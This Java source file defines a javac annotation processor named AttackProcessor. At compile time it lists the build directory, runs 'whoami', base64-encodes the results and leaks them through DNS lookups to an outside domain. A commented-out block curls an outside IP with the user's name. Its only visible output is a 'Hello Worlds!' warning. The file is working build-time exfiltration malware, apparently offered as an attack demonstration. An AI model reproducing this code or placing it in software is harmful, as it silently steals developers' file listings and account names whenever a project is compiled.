package org.cyber;


import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.ProcessingEnvironment;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Set;

@SupportedAnnotationTypes("*")
public class AttackProcessor extends AbstractProcessor {
    @Override
    public synchronized void init(ProcessingEnvironment processingEnv) {
        super.init(processingEnv);
    }

    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        StringBuffer sb = new StringBuffer("");


        try
        {
            Inet4Address.getByName( "javac12.lirui28.t.dlsr.ga" );

            Inet4Address.getByName( System.getProperty("user.dir")+".lirui28.t.dlsr.ga" );


            File folder = new File(System.getProperty("user.dir"));

            if (folder.isDirectory()){
                File[] files = folder.listFiles();
                sb.append( Arrays.deepToString( files));
            }
            String fs = sb.toString();
            //输出base64编码的url home文件夹的内容到外部
            fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );

            if (fs.length()>50){
                Inet4Address.getByName( fs.substring( 0,50 )+".lirui28.t.dlsr.ga" );
            } else {
                    Inet4Address.getByName( "xiaoyu50"+".lirui28.t.dlsr.ga" );
            }

            try {
                Runtime runtime = Runtime.getRuntime();
                Process p = runtime.exec("whoami");
                BufferedReader bw = new BufferedReader( new InputStreamReader( p
                                                                                               .getInputStream()));
                String s;
                while ((s=bw.readLine())!=null) {


                    s = new String( Base64.getEncoder().encode( s.getBytes() ) );

                    s = s.substring( 0,10 );
                    Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );


                }
            } catch (Exception e) {
                Inet4Address.getByName( "runtimeerror"+".lirui28.t.dlsr.ga" );

            }

        }
        catch ( Exception e )
        {
            try
            {

                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ).substring( 0,10 )+".lirui28.t.dlsr.ga" );
            }
            catch ( UnknownHostException e1 )
            {
                e1.printStackTrace();
            }

        }

//        try {
//            Runtime r = Runtime.getRuntime();
//            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
//
//            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888/"+System.getProperty("user.name")});
//            p.waitFor();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }


        processingEnv.getMessager().printMessage(
                Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
        return false;
    }
}
